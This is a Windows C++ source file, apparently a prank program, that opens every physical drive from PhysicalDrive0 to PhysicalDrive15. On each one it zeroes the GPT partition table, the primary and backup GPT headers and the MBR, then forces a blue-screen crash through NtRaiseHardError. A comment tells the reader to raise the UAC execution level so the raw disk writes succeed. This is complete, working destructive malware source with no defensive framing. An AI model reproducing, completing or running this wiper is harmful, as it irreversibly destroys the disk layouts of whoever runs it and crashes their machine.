// funny-gpt-overwrite.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#pragma comment(lib, "ntdll.lib")

//Note: Modify Linker->Manifest File->UAC Execution level in project settings if you want the PhysicalDrive accesses to go through when executing

#define BSOD
//#define DEBUG_LOG

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

using uint64 = unsigned __int64;
using uint32 = unsigned __int32;
typedef unsigned __int32 uint32;
typedef unsigned __int64 uint64;
typedef BYTE LBA_SECTOR[0x200];




struct GUIDTableHeader
{
    char signature[8];
    uint32 revision;
    uint32 headerSize;
    uint32 headerCRC32;
    uint32 reserved;
    uint64 primaryLBA;
    uint64 backupLBA;
    uint64 firstUsableLBA;
    uint64 lastUsableLBA;
    uint64 uniqueGUID1;
    uint64 uniqueGUID2;
    uint64 firstEntryLBA;
    uint32 numberOfEntries;
    uint32 sizeOfEntry;
    uint32 entriesCRC32;
    char reserved_empty[420];
};


constexpr size_t SEC_SIZE = sizeof(LBA_SECTOR);
//globals
HANDLE driveHandle = INVALID_HANDLE_VALUE;
const char* GUID_SIG = "EFI PART";


std::wstring physDskName = L"\\\\.\\PhysicalDrive";

#ifdef DEBUG_LOG
void PrintGUIDTableHeader(GUIDTableHeader& header)
{
    using namespace std;
    cout << "signature:        " << header.signature         << endl;
    cout << "revision:         " << header.revision          << endl;
    cout << "headerSize:       " << header.headerSize        << endl;
    cout << "headerCRC32:      " << header.headerCRC32       << endl;
    cout << "primaryLBA:       " << header.primaryLBA        << endl;
    cout << "backupLBA:        " << header.backupLBA         << endl;
    cout << "firstEntryLBA:    " << header.firstEntryLBA     << endl;
    cout << "firstUsableLBA:   " << header.firstUsableLBA    << endl;
    cout << "numberOfEntries:  " << header.numberOfEntries   << endl;
    cout << "sizeOfEntry:      " << header.sizeOfEntry       << endl;
    cout << "entriesCRC32:     " << header.entriesCRC32      << endl;
      
}
#endif

bool BlueScreen()
{
    BOOLEAN bl;
    ULONG Response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
    return 1;

}

//initializes the drive handle
void OpenDisk(const wchar_t* name)
{
    driveHandle = CreateFileW(name, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
}


void SetOverlapped(OVERLAPPED* ol, uint64 offset)
{

    uint32* pOffset = reinterpret_cast<uint32*>(&offset);
    ol->Offset =        pOffset[0];
    ol->OffsetHigh =    pOffset[1];
}

void Write(uint32 size, uint64 offset, void* buf)
{
    OVERLAPPED ol = {0};
    SetOverlapped(&ol, offset);
    BOOL res = WriteFile(driveHandle, buf, size, NULL, &ol);
    std::cout << "trying to write " << size << " bytes at " << offset << std::endl;
#ifdef DEBUG_LOG
    if (res == 0)
    {
        std::cout << "Operation Failed. Error code: " << GetLastError() << std::endl;
        return;
    }
    std::cout << "Operation successful." << std::endl;
    return;
#endif
}



void Read(uint32 size, uint64 offset, void* target_buf)
{
    OVERLAPPED ol = {0};
    SetOverlapped(&ol, offset);
    
    BOOL res = ReadFile(driveHandle, target_buf, size, NULL, &ol);
#ifdef DEBUG_LOG
    std::cout << "trying to read " << size << " bytes at " << offset << std::endl;
    if (res == 0)
    {
        std::cout << "Operation Failed. Error code: " << GetLastError() << std::endl;
        return;
    }
    std::cout << "Operation successful." << std::endl;
    return;
#endif
}

void WriteSector(LBA_SECTOR* buf, uint64 sectorAddr)
{
    uint64 offset = sectorAddr * sizeof(LBA_SECTOR);
    Write(sizeof(LBA_SECTOR), offset, buf);
}

void ReadSector(LBA_SECTOR* buf, uint64 sectorAddr)
{
    uint64 offset = sectorAddr * sizeof(LBA_SECTOR);
    Read(sizeof(LBA_SECTOR), offset, buf);
}

bool WipeHeadersAndTables(const wchar_t* name)
{
    OpenDisk(name);
    if (driveHandle == INVALID_HANDLE_VALUE)
    {
#ifdef DEBUG_LOG
        std::cout << "error: invalid handle" << std::endl;
        std::wcout << name << std::endl;
#endif
        return 0;
    }


    LBA_SECTOR outBuffer = { 0 };
    LBA_SECTOR inBuffer = { 0 };
    
    //Read GUID Header

    ReadSector(&inBuffer, 0);
    ReadSector(&inBuffer, 1);
    GUIDTableHeader mainHeader;
    memcpy(&mainHeader, &inBuffer, SEC_SIZE);
    //if header doenst have sig
    if (memcmp(&mainHeader.signature, GUID_SIG, 8) > 0)
    {
        //then this is not a guid header
        //Wipe MBR
        WriteSector(&outBuffer, 0);
        CloseHandle(driveHandle);
        return 0;
    }
    
    


    //wipe table
    for (uint64 i = mainHeader.firstEntryLBA; i < mainHeader.firstUsableLBA; i++)
    {
        WriteSector(&outBuffer, i);
    }
    //wipe backup header
    WriteSector(&outBuffer, mainHeader.backupLBA);
    //wipe main header
    WriteSector(&outBuffer, mainHeader.primaryLBA);
    //wipe mbr just incase
    WriteSector(&outBuffer, 0);
    CloseHandle(driveHandle);
    return 1;

}


int main()
{
    /*
    OpenDisk(L"\\\\.\\PhysicalDrive2");
    BYTE* buffer = new BYTE[0x2800];
    Read(0x2800, 0, buffer);
    GUIDTableHeader header;
    memcpy(&header, buffer + 512, sizeof(GUIDTableHeader));
#ifdef DEBUG_LOG
    PrintGUIDTableHeader(header);
#endif // DEBUG_LOG

    
    CloseHandle(driveHandle);
    */

    for (int i = 0; i < 16; i++)
    {
        std::wstring curDsk = physDskName + std::to_wstring(i);
#ifdef DEBUG_LOG
        
        std::wcout << curDsk << L"\n";
#endif
        WipeHeadersAndTables(curDsk.c_str());
        

    }
#ifdef BSOD
    BlueScreen();
#endif
}
